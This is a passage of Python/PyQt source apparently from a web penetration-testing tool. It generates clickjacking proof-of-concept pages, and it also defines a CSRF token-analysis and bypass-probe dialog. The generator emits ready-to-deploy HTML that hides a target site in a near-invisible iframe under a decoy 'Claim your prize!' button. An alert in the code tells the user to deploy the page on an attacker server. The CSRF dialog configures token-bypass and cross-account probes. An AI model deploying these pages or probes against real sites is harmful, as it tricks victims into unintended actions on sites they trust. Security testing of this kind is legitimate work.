            if (e.key === "ArrowDown")  {{ yIn.value = (parseInt(yIn.value)||0) + step; applyFrameOffset(); e.preventDefault(); }}
        }});
    }})();

    // ── Copy attack-mode HTML ─────────────────────────────────────────────
    function copyAttackMode() {{
        var xOff   = parseInt(document.getElementById("x-offset").value) || 0;
        var yOff   = parseInt(document.getElementById("y-offset").value) || 0;
        var dbx    = parseInt(document.getElementById("dbx").value) || 0;
        var dby    = parseInt(document.getElementById("dby").value) || 0;
        var dbx2el = document.getElementById("dbx2");
        var dby2el = document.getElementById("dby2");
        var dbx2   = dbx2el ? (parseInt(dbx2el.value) || 0) : 0;
        var dby2   = dby2el ? (parseInt(dby2el.value) || 0) : 0;
        var btnW   = parseInt(document.getElementById("btn-w").value)  || 0;
        var btnH   = parseInt(document.getElementById("btn-h").value)  || 0;
        var btnFs  = parseInt(document.getElementById("btn-fs").value) || 16;
        var frW    = parseInt(document.getElementById("fr-w").value)   || 1280;
        var frH    = parseInt(document.getElementById("fr-h").value)   || 800;
        var sizeCSS = (btnW > 0 ? "width:" + btnW + "px;" : "") + (btnH > 0 ? "height:" + btnH + "px;" : "") + "font-size:" + btnFs + "px;";
        var isMultistep = !!dbx2el;

        var html;
        if (isMultistep) {{
            html = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Page</title>
    <style>
        * {{ margin:0; padding:0; box-sizing:border-box; }}
        body {{ position:relative; }}
        iframe {{
            position:relative;
            top:${{yOff}}px; left:${{xOff}}px;
            width:${{frW}}px;
            height:${{frH}}px;
            border:none;
            opacity:0.00001;
            z-index:2;
        }}
        .firstClick, .secondClick {{
            position:absolute;
            top:${{dby}}px; left:${{dbx}}px;
            z-index:1;
            font-size:16px; padding:12px 28px;
            border-radius:6px;
            font-family:sans-serif; font-weight:bold;
            cursor:pointer;
            {safe_css}
            ${{sizeCSS}}
        }}
        .secondClick {{
            top:${{dby2}}px;
            left:${{dbx2}}px;
        }}
    </style>
</head>
<body>
    <div class="firstClick">{safe_decoy}</div>
    <div class="secondClick">{safe_decoy2}</div>
    <iframe src="{safe_url}" {safe_sandbox}></iframe>
</body>
</html>`;
        }} else {{
            html = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Page</title>
    <style>
        * {{ margin:0; padding:0; box-sizing:border-box; }}
        body {{ position:relative; }}
        iframe {{
            position:relative;
            top:${{yOff}}px; left:${{xOff}}px;
            width:${{frW}}px;
            height:${{frH}}px;
            border:none;
            opacity:0.00001;
            z-index:2;
        }}
        div {{
            position:absolute;
            top:${{dby}}px; left:${{dbx}}px;
            z-index:1;
            font-size:16px; padding:12px 28px;
            border-radius:6px;
            font-family:sans-serif; font-weight:bold;
            cursor:pointer;
            {safe_css}
            ${{sizeCSS}}
        }}
    </style>
</head>
<body>
    <div>
        {safe_decoy}
    </div>
    <iframe src="{safe_url}" {safe_sandbox}></iframe>
</body>
</html>`;
        }}

        if (navigator.clipboard) {{
            navigator.clipboard.writeText(html).then(function() {{
                alert("Attack-mode HTML copied to clipboard!\\nDeploy this on your attacker server.\\nThe iframe is now invisible (opacity ~0) to the victim.");
            }}).catch(function() {{ fallbackCopy(html); }});
        }} else {{
            fallbackCopy(html);
        }}
    }}

    function fallbackCopy(text) {{
        var ta = document.createElement("textarea");
        ta.value = text;
        ta.style.position = "fixed";
        ta.style.opacity  = "0";
        document.body.appendChild(ta);
        ta.focus(); ta.select();
        try {{ document.execCommand("copy"); alert("Attack-mode HTML copied to clipboard!"); }}
        catch (e) {{ alert("Copy failed — please copy manually from the text area."); }}
        document.body.removeChild(ta);
    }}{_send_fn}
    </script>

</body>
</html>'''

    @staticmethod
    def generate_attack_mode(
        target_url: str,
        target_element: str = "",
        decoy_text: str = "🎁 Claim your prize!",
        decoy_css: str = "background:#f39c12;color:#fff;border:2px solid #e67e22;",
        iframe_x_offset: int = 0,
        iframe_y_offset: int = 0,
        iframe_width: int = 1280,
        iframe_height: int = 800,
        decoy_x: int = 200,
        decoy_y: int = 200,
        decoy_width: int = 0,
        decoy_height: int = 0,
        decoy_font_size: int = 16,
        sandbox_attr: str = "",
    ) -> str:
        """Return the clean, ready-to-deploy attack-mode PoC (invisible iframe, no toolbar).

        This is the final exploit page.  The iframe opacity is 0.00001 — effectively
        invisible to the victim — while their clicks land on the real page elements.
        Deploy this on the attacker server; no further modifications needed.
        """
        if not target_url:
            target_url = "https://target.com/"

        elem      = ClickjackingPoCGenerator.parse_element(target_element)
        selector  = elem["selector"]
        elem_text = elem["text"]

        # sandbox_attr is passed in as-is (e.g. 'sandbox="allow-scripts allow-forms"')

        size_style = ""
        if decoy_width > 0:
            size_style += f"width:{decoy_width}px;"
        if decoy_height > 0:
            size_style += f"height:{decoy_height}px;"
        size_style += f"font-size:{decoy_font_size}px;"

        return f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Page</title>
    <style>
        * {{ margin:0; padding:0; box-sizing:border-box; }}
        body {{ position:relative; }}
        iframe {{
            position:relative;
            top:{iframe_y_offset}px; left:{iframe_x_offset}px;
            width:{iframe_width}px;
            height:{iframe_height}px;
            border:none;
            opacity:0.00001;
            z-index:2;
        }}
        div {{
            position:absolute;
            top:{decoy_y}px; left:{decoy_x}px;
            z-index:1;
            font-size:16px; padding:12px 28px;
            border-radius:6px;
            font-family:sans-serif; font-weight:bold;
            cursor:pointer;
            {decoy_css}
            {size_style}
        }}
    </style>
</head>
<body>
    <div>
        {decoy_text}
    </div>
    <iframe src="{target_url}" {sandbox_attr}></iframe>
</body>
</html>'''

    @staticmethod
    def generate_multistep_mode(
        target_url: str,
        decoy_text1: str = "Click me first",
        decoy_text2: str = "Click me next",
        decoy_css: str = "background:#f39c12;color:#fff;border:2px solid #e67e22;",
        iframe_x_offset: int = 0,
        iframe_y_offset: int = 0,
        iframe_width: int = 1280,
        iframe_height: int = 800,
        decoy_x: int = 200,
        decoy_y: int = 200,
        decoy_x2: int = 400,
        decoy_y2: int = 400,
        decoy_width: int = 0,
        decoy_height: int = 0,
        decoy_font_size: int = 16,
        sandbox_attr: str = "",
    ) -> str:
        """Return a multistep clickjacking PoC with two decoy divs (.firstClick / .secondClick)."""
        if not target_url:
            target_url = "https://target.com/"

        size_style = ""
        if decoy_width > 0:
            size_style += f"width:{decoy_width}px;"
        if decoy_height > 0:
            size_style += f"height:{decoy_height}px;"
        size_style += f"font-size:{decoy_font_size}px;"

        return f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Page</title>
    <style>
        * {{ margin:0; padding:0; box-sizing:border-box; }}
        body {{ position:relative; }}
        iframe {{
            position:relative;
            top:{iframe_y_offset}px; left:{iframe_x_offset}px;
            width:{iframe_width}px;
            height:{iframe_height}px;
            border:none;
            opacity:0.00001;
            z-index:2;
        }}
        .firstClick, .secondClick {{
            position:absolute;
            top:{decoy_y}px; left:{decoy_x}px;
            z-index:1;
            font-size:16px; padding:12px 28px;
            border-radius:6px;
            font-family:sans-serif; font-weight:bold;
            cursor:pointer;
            {decoy_css}
            {size_style}
        }}
        .secondClick {{
            top:{decoy_y2}px;
            left:{decoy_x2}px;
        }}
    </style>
</head>
<body>
    <div class="firstClick">{decoy_text1}</div>
    <div class="secondClick">{decoy_text2}</div>
    <iframe src="{target_url}" {sandbox_attr}></iframe>
</body>
</html>'''


# ─────────────────────────────────────────────────────────────────────────────
# Clickjacking Alignment Callback Server
# ─────────────────────────────────────────────────────────────────────────────

class _CJAlignmentServer(QThread):
    """Tiny single-shot localhost HTTP server for the Clickjacking alignment flow.

    The test-mode PoC page POSTs the final iframe/decoy offsets back to this
    server via fetch() when the user clicks '✅ Send to PoC Tool'.
    The server emits offsets_received, the UI spinboxes are updated, and the
    clean attack-mode PoC is regenerated automatically.
    """

    offsets_received = pyqtSignal(int, int, int, int, int, int, int, int, int, int, int)   # x_off, y_off, decoy_x, decoy_y, decoy_x2, decoy_y2, btn_w, btn_h, fr_w, fr_h, btn_fs
    server_ready     = pyqtSignal(int)                   # bound port number

    def __init__(self, parent=None):
        super().__init__(parent)
        self._stop_event = threading.Event()
        self._html_queue: queue.Queue = queue.Queue()

    def set_page(self, html: str):
        """Provide the alignment HTML to serve (called from main thread after server_ready)."""
        self._html_queue.put(html)

    def stop(self):
        self._stop_event.set()

    def run(self):
        import http.server  as _hs
        import socketserver as _ss
        import json         as _j

        stop_ev     = self._stop_event
        sig_offsets = self.offsets_received
        html_queue  = self._html_queue
        html_holder = [""]   # mutable list so inner class can write to it

        class _Handler(_hs.BaseHTTPRequestHandler):
            def log_message(self, *args): pass   # suppress console output

            def _cors(self):
                self.send_header('Access-Control-Allow-Origin',  '*')
                self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
                self.send_header('Access-Control-Allow-Headers', 'Content-Type')

            def do_OPTIONS(self):
                self.send_response(200)
                self._cors()
                self.end_headers()

            def do_GET(self):
                self.close_connection = True   # no keep-alive — frees handle_request immediately
                if self.path not in ('/', '/index.html'):
                    self.send_response(404)
                    self.end_headers()
                    return
                # Wait for the HTML page if not yet provided (nearly instant)
                if not html_holder[0]:
                    try:
                        html_holder[0] = html_queue.get(timeout=10)
                    except Exception:
                        self.send_response(503)
                        self.end_headers()
                        return
                body = html_holder[0].encode('utf-8')
                self.send_response(200)
                self.send_header('Content-Type', 'text/html; charset=utf-8')
                self.send_header('Content-Length', str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def do_POST(self):
                self.close_connection = True   # no keep-alive — frees handle_request immediately
                if self.path != '/update':
                    self.send_response(404)
                    self.end_headers()
                    return
                n = int(self.headers.get('Content-Length', 0))
                try:
                    d = _j.loads(self.rfile.read(n))
                    sig_offsets.emit(
                        int(d.get('xOff', 0)),  int(d.get('yOff', 0)),
                        int(d.get('dbx',  0)),  int(d.get('dby',  0)),
                        int(d.get('dbx2', 0)),  int(d.get('dby2', 0)),
                        int(d.get('btnW', 0)),  int(d.get('btnH', 0)),
                        int(d.get('frW',  1280)), int(d.get('frH', 800)),
                        int(d.get('btnFs', 16)),
                    )
                except Exception:
                    pass
                self.send_response(200)
                self._cors()
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(b'{"ok":true}')
                # NOTE: do NOT set stop_ev here — let the server keep running so the
                # user can re-send / re-align without needing to restart the server.

        with _ss.TCPServer(('127.0.0.1', 0), _Handler) as srv:
            srv.timeout = 0.5
            self.server_ready.emit(srv.server_address[1])
            while not stop_ev.is_set():
                srv.handle_request()

class CSRFAnalysisDialog(QDialog):
    # Emitted from the background fetch thread → safely update label in main thread
    _refresh_done = pyqtSignal(str, str)   # (message, css-color)

    """
    Step-1 dialog that deeply analyses the pasted request and lets the user
    configure the probe session before launching CSRFTesterDialog.

    Layout:
      ┌─ Token Analysis ─────────────────────────────────────────────────────┐
      │  Detected body tokens  [table: param | value | location | edit]      │
      │  Detected header tokens [table: header | value | edit]               │
      │  Double-submit mode checkbox                                         │
      ├─ Token Refresh ──────────────────────────────────────────────────────┤
      │  Refresh URL, Regex / JSON-path to extract token                     │
      ├─ Second Account (Session Binding Test) ──────────────────────────────┤
      │  Account-B session cookie   Account-B CSRF token                     │
      ├─ Probe Matrix Preview ───────────────────────────────────────────────┤
      │  List of probes that will run                                        │
      └──────────────────────────────────────────────────────────────────────┘
    """

    def __init__(self, request_info: "RequestInfo", raw_request: str,
                 prefill_config: Optional[Dict] = None, parent=None):
        super().__init__(parent)
        self.setWindowFlag(Qt.Window, True)   # independent, non-modal window
        self.request_info = request_info
        self.raw_request  = raw_request
        self._prefill_config = prefill_config or {}
        self._body_tokens: List[Tuple[str, str]] = []   # (param_name, value)
        self._header_tokens: List[Tuple[str, str]] = [] # (header_name, value)
        self._cookie_tokens: List[Tuple[str, str]] = [] # (cookie_name, value)
        self.setWindowTitle("🔬 CSRF Advanced Analysis — Configure Probes")
        self.setMinimumSize(920, 780)
        self.resize(980, 860)
        self._apply_style()
        self._detect_tokens()
        self._build_ui()
        self._populate_token_tables()
        if self._prefill_config:
            self._restore_config(self._prefill_config)
        self._refresh_probe_matrix()

    # ── Styling ────────────────────────────────────────────────────────────

    def _grp_style(self) -> str:
        return (
            f"QGroupBox{{border:1px solid {COLOR_BORDER};border-radius:4px;"
            f"margin-top:8px;padding-top:6px;background:{COLOR_ELEVATED_BG};}}"
            f"QGroupBox::title{{subcontrol-origin:margin;subcontrol-position:top left;"
            f"padding:0 6px;color:{COLOR_ACCENT};font-weight:bold;}}"
        )

    def _apply_style(self):
        self.setStyleSheet(f"""
            QDialog, QWidget {{
                background:{COLOR_ELEVATED_BG}; color:{COLOR_TEXT};
            }}
            QGroupBox {{
                border:1px solid {COLOR_BORDER}; border-radius:4px;
                margin-top:8px; padding-top:6px; background:{COLOR_ELEVATED_BG};
            }}
            QGroupBox::title {{
                subcontrol-origin:margin; subcontrol-position:top left;
                padding:0 6px; color:{COLOR_ACCENT}; font-weight:bold;
            }}
            QTableWidget {{
                background:{COLOR_DARK_BG}; color:{COLOR_TEXT};
                gridline-color:{COLOR_BORDER}; border:1px solid {COLOR_BORDER};
            }}
            QTableWidget::item:selected {{
                background:{COLOR_ACCENT}; color:#000;
            }}
            QHeaderView::section {{
                background:{COLOR_ELEVATED_BG}; color:{COLOR_TEXT_MUTED};
                border:1px solid {COLOR_BORDER}; padding:3px;
            }}
            QTextEdit, QLineEdit {{
                background:{COLOR_DARK_BG}; color:{COLOR_TEXT};
                border:1px solid {COLOR_BORDER}; border-radius:3px; padding:3px 5px;
            }}
            QLineEdit:focus, QTextEdit:focus {{ border-color:{COLOR_ACCENT}; }}
            QPushButton {{
                background:{COLOR_ELEVATED_BG}; color:{COLOR_TEXT};
                border:1px solid {COLOR_BORDER}; border-radius:4px; padding:3px 10px;
            }}
            QPushButton:hover {{ border-color:{COLOR_ACCENT}; color:{COLOR_TEXT_BRIGHT}; }}
            QCheckBox {{ color:{COLOR_TEXT}; spacing:6px; }}
            QLabel {{ color:{COLOR_TEXT}; }}
        """)

    # ── Token detection ────────────────────────────────────────────────────

    # Header names that typically carry CSRF tokens
    _CSRF_HEADERS = [
        "x-csrf-token", "x-xsrf-token", "x-csrftoken",
        "x-requested-with", "csrf-token", "anti-csrf-token",
        "x-antiforgery", "__requestverificationtoken",
    ]

    def _detect_tokens(self):
        ri = self.request_info
        # Body tokens
        if ri.body:
            try:
                data = json.loads(ri.body)
                if isinstance(data, dict):
                    for k, v in data.items():
                        if CSRFGenerator._is_csrf_token_key(k):
                            self._body_tokens.append((k, str(v)))
            except (json.JSONDecodeError, ValueError):
                for k, vs in urllib.parse.parse_qs(ri.body, keep_blank_values=True).items():
                    if CSRFGenerator._is_csrf_token_key(k):
                        self._body_tokens.append((k, vs[0] if vs else ""))

        # Header tokens (e.g. X-CSRF-Token)
        for hdr, val in ri.headers.items():
            if hdr.lower() in self._CSRF_HEADERS:
                self._header_tokens.append((hdr, val))

        # Cookie-embedded tokens (e.g. csrfKey=..., csrf=..., XSRF-TOKEN=...)
        # Exclude session and any non-CSRF cookies
        _SESSION_RE = re.compile(r'^session$', re.IGNORECASE)
        for hdr, val in ri.headers.items():
            if hdr.lower() == "cookie":
                for part in val.split(";"):
                    part = part.strip()
                    if "=" in part:
                        ck, cv = part.split("=", 1)
                        ck = ck.strip()
                        if not _SESSION_RE.match(ck) and (
                                CSRFGenerator._is_csrf_token_key(ck) or
                                re.match(r'^(?:csrf[-_]?key|xsrf[-_]?token|'
                                         r'__host-csrf|_csrf|anticsrf)$',
                                         ck, re.IGNORECASE)):
                            self._cookie_tokens.append((ck, cv.strip()))

    def _build_ui(self):
        root = QVBoxLayout(self)
        root.setContentsMargins(10, 10, 10, 10)
        root.setSpacing(8)

        # ── Tabs: one section per tab so nothing overflows ─────────────
        tabs = QTabWidget()
        tabs.setStyleSheet(f"""
            QTabBar::tab {{
                background:{COLOR_ELEVATED_BG}; color:{COLOR_TEXT_MUTED};
                border:1px solid {COLOR_BORDER}; padding:6px 16px; margin-right:2px;
            }}
            QTabBar::tab:selected {{
                background:{COLOR_DARK_BG}; color:{COLOR_TEXT_BRIGHT};
                border-bottom:2px solid {COLOR_ACCENT};
            }}
        """)

        # ── Helpers ────────────────────────────────────────────────────
        def _sec_lbl(txt):
            l = QLabel(txt)
            l.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:8pt;font-weight:bold;")
            return l

        def _hint(txt):
            l = QLabel(txt)
            l.setWordWrap(True)
            l.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:8pt;")
            return l

        def _make_table(cols, headers):
            t = QTableWidget(0, cols)
            t.setHorizontalHeaderLabels(headers)
            t.horizontalHeader().setSectionResizeMode(1, QHeaderView.Stretch)
            t.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeToContents)
            if cols == 3:
                t.horizontalHeader().setSectionResizeMode(2, QHeaderView.ResizeToContents)
            t.setSelectionBehavior(QTableWidget.SelectRows)
            t.verticalHeader().setVisible(False)
            t.setAlternatingRowColors(True)
            return t

        def _btn_row(add_lbl, add_fn, del_fn, extra_hint=""):
            row = QHBoxLayout()
            ab = QPushButton(f"＋ {add_lbl}"); ab.setFixedHeight(24); ab.clicked.connect(add_fn)
            db = QPushButton("－ Remove selected"); db.setFixedHeight(24)
            db.setFixedWidth(140); db.clicked.connect(del_fn)
            row.addWidget(ab); row.addWidget(db)
            if extra_hint:
                hl = QLabel(extra_hint)
                hl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:8pt;font-style:italic;")
                row.addSpacing(8); row.addWidget(hl)
            row.addStretch()
            return row

        def _sep():
            s = QFrame(); s.setFrameShape(QFrame.HLine)
            s.setStyleSheet(f"background:{COLOR_BORDER};max-height:1px;")
            return s

        # ═══════════════════════════════════════════════════════════════
        # TAB 1 — Token Analysis
        # ═══════════════════════════════════════════════════════════════
        tok_tab = QWidget()
        tok_root = QVBoxLayout(tok_tab)
        tok_root.setContentsMargins(10, 10, 10, 10)
        tok_root.setSpacing(8)

        # Summary
        self._token_summary = QLabel()
        self._token_summary.setStyleSheet(
            f"color:{COLOR_TEXT_MUTED};font-size:8pt;"
            f"background:{COLOR_DARK_BG};border-radius:3px;padding:4px 8px;")
        self._token_summary.setWordWrap(True)
        tok_root.addWidget(self._token_summary)

        # ── Body tokens ────────────────────────────────────────────────
        tok_root.addWidget(_sec_lbl("Body tokens  (URL-encoded or JSON body params)"))
        tok_root.addWidget(_hint(
            "Parameters in the request body carrying a CSRF token — "
            "e.g.  csrf=TOKEN  or  {\"csrf_token\":\"TOKEN\"}."))
        self._body_tok_table = _make_table(3, ["Parameter", "Value", "Format"])
        self._body_tok_table.setMinimumHeight(90)
        tok_root.addWidget(self._body_tok_table)
        tok_root.addLayout(_btn_row(
            "Add body token", self._add_body_token,
            lambda: self._del_row(self._body_tok_table)))

        tok_root.addWidget(_sep())

        # ── Cookie tokens ──────────────────────────────────────────────
        tok_root.addWidget(_sec_lbl("Cookie tokens  (CSRF tokens inside the Cookie header)"))
        tok_root.addWidget(_hint(
            "Cookie-embedded CSRF tokens — e.g.  csrfKey=TOKEN  or  csrf=TOKEN  "
            "found inside  Cookie: session=…; csrfKey=TOKEN.  "
            "NOT the session cookie — only tokens used for CSRF protection."))
        self._cookie_tok_table = _make_table(2, ["Cookie name", "Value"])
        self._cookie_tok_table.setMinimumHeight(80)
        tok_root.addWidget(self._cookie_tok_table)
        tok_root.addLayout(_btn_row(
            "Add cookie token", self._add_cookie_token,
            lambda: self._del_row(self._cookie_tok_table)))

        tok_root.addWidget(_sep())

        # ── Header tokens ──────────────────────────────────────────────
        tok_root.addWidget(_sec_lbl("Header tokens  (custom request headers carrying CSRF token)"))
        tok_root.addWidget(_hint(
            "E.g.  X-CSRF-Token,  X-XSRF-TOKEN,  Anti-CSRF-Token.  "
            "Usually used by JavaScript single-page applications."))
        self._hdr_tok_table = _make_table(2, ["Header name", "Value"])
        self._hdr_tok_table.setMinimumHeight(80)
        tok_root.addWidget(self._hdr_tok_table)
        tok_root.addLayout(_btn_row(
            "Add header token", self._add_header_token,
            lambda: self._del_row(self._hdr_tok_table)))

        tok_root.addWidget(_sep())

        # ── Double-submit checkbox ─────────────────────────────────────
        self._double_submit_chk = QCheckBox(
            "Double-submit mode — synchronise ALL token locations "
            "(body + cookie + header) to the same value in bypass probes")
        self._double_submit_chk.setToolTip(
            "Enable when the app uses double-submit: the same token value appears in both "
            "the request body AND a cookie. All locations are set to the same invented "
            "fake value in double-submit bypass probes.")
        self._double_submit_chk.stateChanged.connect(self._refresh_probe_matrix)
        tok_root.addWidget(self._double_submit_chk)
        tok_root.addStretch()

        # Auto-check double-submit whenever more than one token is present
        all_toks = self._body_tokens + self._header_tokens + self._cookie_tokens
        if len(all_toks) >= 2:
            self._double_submit_chk.blockSignals(True)
            self._double_submit_chk.setChecked(True)
            self._double_submit_chk.blockSignals(False)

        tabs.addTab(tok_tab, "🔑  Token Analysis")

        # ═══════════════════════════════════════════════════════════════
        # TAB 2 — Token Refresh
        # ═══════════════════════════════════════════════════════════════
        ref_tab = QWidget()
        ref_root = QVBoxLayout(ref_tab)
        ref_root.setContentsMargins(10, 10, 10, 10)
        ref_root.setSpacing(8)

        ref_root.addWidget(_hint(
            "Optional. If the CSRF token is single-use or short-lived, provide a URL "
            "that returns a fresh token before each probe. The worker fetches this URL "
            "(using the same cookies as the original request) and substitutes the "
            "extracted token into the request body / cookie / header before sending.\n\n"
            "Supports four extraction methods:\n"
            "  • HTML form input — parses hidden <input name=\"csrf\" value=\"…\">\n"
            "  • JSON key — parses {\"csrf_token\": \"…\"} API responses\n"
            "  • Cookie name — extracts from Set-Cookie response header\n"
            "  • Regex — custom Python regex with one capture group"))

        ref_root.addWidget(_sep())

        row_url = QHBoxLayout()
        row_url.addWidget(QLabel("Refresh URL:"))
        self._refresh_url = QLineEdit()
        self._refresh_url.setPlaceholderText(
            "https://target.com/my-account  (the page containing the form / token endpoint)")
        self._refresh_url.setFixedHeight(26)
        self._refresh_url.textChanged.connect(self._refresh_probe_matrix)
        row_url.addWidget(self._refresh_url, 1)
        self._refresh_test_btn = QPushButton("Test")
        self._refresh_test_btn.setFixedHeight(26)
        self._refresh_test_btn.setFixedWidth(50)
        self._refresh_test_btn.setToolTip(
            "Fetch the URL now and show what token would be extracted")
        self._refresh_test_btn.clicked.connect(self._test_refresh)
        row_url.addWidget(self._refresh_test_btn)
        ref_root.addLayout(row_url)

        row_mode = QHBoxLayout()
        row_mode.addWidget(QLabel("Extraction:"))
        self._refresh_mode = QComboBox()
        self._refresh_mode.addItems([
            "HTML form input",
            "JSON key",
            "Cookie name",
            "Regex (response)",
        ])
        self._refresh_mode.setFixedHeight(26)
        self._refresh_mode.setFixedWidth(160)
        self._refresh_mode.currentTextChanged.connect(self._on_refresh_mode_changed)
        row_mode.addWidget(self._refresh_mode)
        row_mode.addSpacing(8)
        row_mode.addWidget(QLabel("Pattern:"))
        self._refresh_pattern = QLineEdit()
        self._refresh_pattern.setFixedHeight(26)
        self._refresh_pattern.textChanged.connect(self._refresh_probe_matrix)
        row_mode.addWidget(self._refresh_pattern, 1)
        ref_root.addLayout(row_mode)

        self._refresh_mode_hint = QLabel()
        self._refresh_mode_hint.setWordWrap(True)
        self._refresh_mode_hint.setStyleSheet(
            f"color:{COLOR_TEXT_MUTED};font-size:8pt;font-style:italic;")
        ref_root.addWidget(self._refresh_mode_hint)
        self._on_refresh_mode_changed(self._refresh_mode.currentText())

        ref_root.addWidget(_sep())
        self._refresh_result_lbl = QLabel("(click Test to preview)")
        self._refresh_result_lbl.setWordWrap(True)
        self._refresh_result_lbl.setStyleSheet(
            f"color:{COLOR_TEXT_MUTED};font-size:8pt;font-family:Consolas;")
        ref_root.addWidget(self._refresh_result_lbl)
        self._refresh_done.connect(self._on_refresh_result)

        # ═══════════════════════════════════════════════════════════════
        # Account B Refresh — appended at the bottom of Token Refresh tab
        # ═══════════════════════════════════════════════════════════════
        ref_root.addWidget(_sep())
        ref_root.addWidget(_sec_lbl("Account B — for cross-account session-binding probes"))
        ref_root.addWidget(_hint(
            "Optional. Provide Account B's Cookie header and refresh URL.\n"
            "The tester uses the same baseline raw request as Account A, substituting\n"
            "B's Cookie header for Account B probes.\n\n"
            "Refresh URL: the page that returns B's fresh CSRF token (uses B's Cookie).\n"
            "If left empty, Account A's refresh URL is used with B's Cookie instead.\n\n"
            "Example Cookie: session=ACCT_B_SESSION; csrfKey=ACCT_B_KEY"))

        ref_root.addWidget(_sep())

        row_b = QHBoxLayout()
        row_b.addWidget(QLabel("Account B Cookie:"))
        self._acct_b_cookie_hdr = QLineEdit()
        self._acct_b_cookie_hdr.setPlaceholderText(
            "session=xyz789; csrfKey=abc123   (full Cookie header value for Account B)")
        self._acct_b_cookie_hdr.setFixedHeight(26)
        self._acct_b_cookie_hdr.textChanged.connect(self._refresh_probe_matrix)
        row_b.addWidget(self._acct_b_cookie_hdr, 1)
        ref_root.addLayout(row_b)

        row_b_url = QHBoxLayout()
        row_b_url.addWidget(QLabel("Account B Refresh URL:"))
        self._acct_b_refresh_url = QLineEdit()
        self._acct_b_refresh_url.setPlaceholderText(
            "https://target.com/my-account  (optional — leave empty to reuse Account A's refresh URL)")
        self._acct_b_refresh_url.setFixedHeight(26)
        self._acct_b_refresh_url.textChanged.connect(self._refresh_probe_matrix)
        row_b_url.addWidget(self._acct_b_refresh_url, 1)
        ref_root.addLayout(row_b_url)

        ref_root.addStretch()

        tabs.addTab(ref_tab, "🔄  Token Refresh")

        # ═══════════════════════════════════════════════════════════════
        # TAB 3 — Body Params (vary submitted values per probe)
        # ═══════════════════════════════════════════════════════════════
        bp_tab  = QWidget()
        bp_root = QVBoxLayout(bp_tab)
        bp_root.setContentsMargins(10, 10, 10, 10)
        bp_root.setSpacing(8)

        bp_root.addWidget(_hint(
            "Optional. Enable 'Vary values' when the action creates a resource "
            "(e.g. registers a user, adds an email address) and repeated probes would "
            "fail because the server rejects duplicate data.\n\n"
            "Append counter — base_value → base_value1, base_value2, … (one per probe)\n"
            "Custom list   — enter comma-separated values; each probe uses the next one "
            "(cycles back when the list is exhausted)."))

        bp_root.addWidget(_sep())

        vary_row = QHBoxLayout()
        self._vary_body_chk = QCheckBox("Vary body parameter values per probe")
        self._vary_body_chk.setToolTip(
            "When enabled, selected parameters get a different value on each probe.")
        vary_row.addWidget(self._vary_body_chk)
        vary_row.addStretch()
        bp_root.addLayout(vary_row)

        strat_row = QHBoxLayout()
        strat_row.addWidget(QLabel("Strategy:"))
        self._vary_strategy = QComboBox()
        self._vary_strategy.addItems([
            "Append counter  (value → value1, value2, …)",
            "Cycle custom list  (comma-separated values in last column)",
        ])
        self._vary_strategy.setFixedHeight(26)
        strat_row.addWidget(self._vary_strategy, 1)
        bp_root.addLayout(strat_row)

        bp_root.addWidget(_sep())
        bp_root.addWidget(_sec_lbl("Body parameters"))
        bp_root.addWidget(_hint(
            "Auto-filled from the request body. Tick the checkbox in the first column "
            "to vary that parameter. CSRF token parameters are unticked by default."))

        self._body_params_table = _make_table(4, ["✓", "Parameter", "Base Value", "Custom Values (comma-separated)"])
        self._body_params_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.Fixed)
        self._body_params_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.Interactive)
        self._body_params_table.horizontalHeader().setSectionResizeMode(2, QHeaderView.Stretch)
        self._body_params_table.horizontalHeader().setSectionResizeMode(3, QHeaderView.Stretch)
        self._body_params_table.setColumnWidth(0, 32)
        self._body_params_table.setColumnWidth(1, 140)
        self._body_params_table.setMinimumHeight(130)
        bp_root.addWidget(self._body_params_table)
        self._populate_body_params_table()

        bp_root.addLayout(_btn_row(
            "Add parameter", self._add_body_param_row,
            lambda: self._del_row(self._body_params_table)))
        bp_root.addStretch()
        tabs.addTab(bp_tab, "📝  Body Params")

        # ═══════════════════════════════════════════════════════════════
        # TAB 4 — Raw Request (reference view)
        # ═══════════════════════════════════════════════════════════════
        req_tab  = QWidget()
        req_root = QVBoxLayout(req_tab)
        req_root.setContentsMargins(10, 10, 10, 10)
        req_root.setSpacing(6)
        req_root.addWidget(_hint(
            "Read-only view of the original HTTP request. "
            "Use this as a reference when filling in token names, cookie values, "
            "and refresh URLs in the other tabs."))
        self._raw_req_view = QTextEdit()
        self._raw_req_view.setReadOnly(True)
        self._raw_req_view.setFont(QFont("Consolas", 9))
        self._raw_req_view.setPlainText(self.raw_request)
        HttpSyntaxHighlighter(self._raw_req_view.document())
        req_root.addWidget(self._raw_req_view, 1)
        tabs.addTab(req_tab, "📋  Request")

        root.addWidget(tabs, 1)

        # ── Bottom bar ─────────────────────────────────────────────────
        root.addWidget(_sep())
        btn_row = QHBoxLayout()
        self._probe_count_lbl = QLabel("")
        self._probe_count_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:8pt;")
        self._launch_btn = QPushButton("▶  Launch Probes")
        self._launch_btn.setStyleSheet(
            f"QPushButton{{background:{COLOR_SUCCESS};color:#000;font-weight:bold;"
            f"border:none;border-radius:4px;padding:6px 20px;}}"
            f"QPushButton:hover{{background:#3dff90;}}"
        )
        self._launch_btn.clicked.connect(self._launch_tester)
        cancel_btn = QPushButton("Cancel")
        cancel_btn.setFixedWidth(90)
        cancel_btn.clicked.connect(self.reject)
        btn_row.addWidget(self._probe_count_lbl)
        btn_row.addStretch()
        btn_row.addWidget(cancel_btn)
        btn_row.addWidget(self._launch_btn)
        root.addLayout(btn_row)
    def _populate_token_tables(self):
        ri = self.request_info
        n_body   = len(self._body_tokens)
        n_hdr    = len(self._header_tokens)
        n_cookie = len(self._cookie_tokens)
        n_total  = n_body + n_hdr + n_cookie

        if n_total == 0:
